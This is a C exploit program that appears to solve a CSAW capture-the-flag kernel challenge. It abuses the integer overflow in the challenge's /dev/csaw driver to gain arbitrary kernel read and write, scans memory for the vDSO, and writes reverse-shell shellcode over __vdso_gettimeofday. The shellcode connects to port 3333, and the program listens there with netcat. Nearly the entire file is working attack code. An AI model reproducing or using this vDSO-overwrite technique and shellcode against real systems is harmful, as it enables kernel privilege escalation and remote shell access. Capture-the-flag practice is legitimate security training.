/* musl-gcc exp.c -o exp -static */
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE + 1
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE + 3
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE + 5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE + 6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE + 7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE + 8

#define SEEK_SET	0

typedef unsigned long loff_t;

struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

int main(void)
{
    unsigned long r;
    int fd = open("/dev/csaw", O_RDWR);

    if (fd < 0) {
	    fprintf(stderr, "failed to open %s: %d\n", "/dev/csaw", fd);
	    exit(1);
    }

    /* alloc channel */
    struct alloc_channel_args alloc_channel;
    alloc_channel.buf_size = 0x2000;
    ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    int id = alloc_channel.id;
    printf("[+] channel id: %d\n", id);

    /* grow channel */
    struct grow_channel_args grow_channel;
    grow_channel.id = id;
    grow_channel.size = 0xffffffffffffffff - alloc_channel.buf_size;
    ioctl(fd, CSAW_GROW_CHANNEL, &grow_channel);

    /* leak vdso */
    struct seek_channel_args seek_channel;
    seek_channel.id = id;
    seek_channel.whence = SEEK_SET;

    struct read_channel_args read_channel;
    char *buf = (char *)malloc(alloc_channel.buf_size);
    memset((void *)buf, 0, alloc_channel.buf_size);
    read_channel.id = alloc_channel.id;
    read_channel.buf = buf;
    read_channel.count = 0x2000;

    unsigned long vdso = 0xffffffff81000000;

    for (; vdso < 0xffffffffffffefff; vdso += 0x1000) {
        /* seek channel */
        seek_channel.index = vdso - 0x10;  /* channel->data became 0x10 */
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        /* read channel */
        ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
        if (!strcmp(buf + 0x2c6, "__vdso_gettimeofday")) {
            printf("[+] kernel vDSO address: %p\n", (void *)vdso);
            break;
	    }
    }

    /*
     * https://gist.github.com/itsZN/1ab36391d1849f15b785
     * reverse shell (127.0.0.1:3333)
     */
    char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";

    /* write shellcode to __vdso_gettimeofday */
    seek_channel.index = vdso - 0x10 + 0xc80;    /* again, channel->data is now 0x10 */
    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    struct write_channel_args write_channel;
    write_channel.id = id;
    write_channel.buf = shellcode;
    write_channel.count = sizeof(shellcode);
    ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);

    /* catch that shell! */
    pid_t pid = fork();
    if (pid == 0) {
        printf("[+] waiting for reverse shell...\n");
        system("nc -lp 3333");
    }
    wait(NULL);

    /* clean up */
    struct close_channel_args close_channel;
    close_channel.id = id;
    ioctl(fd, CSAW_CLOSE_CHANNEL, &close_channel);
    close(fd);
    return 0;
}
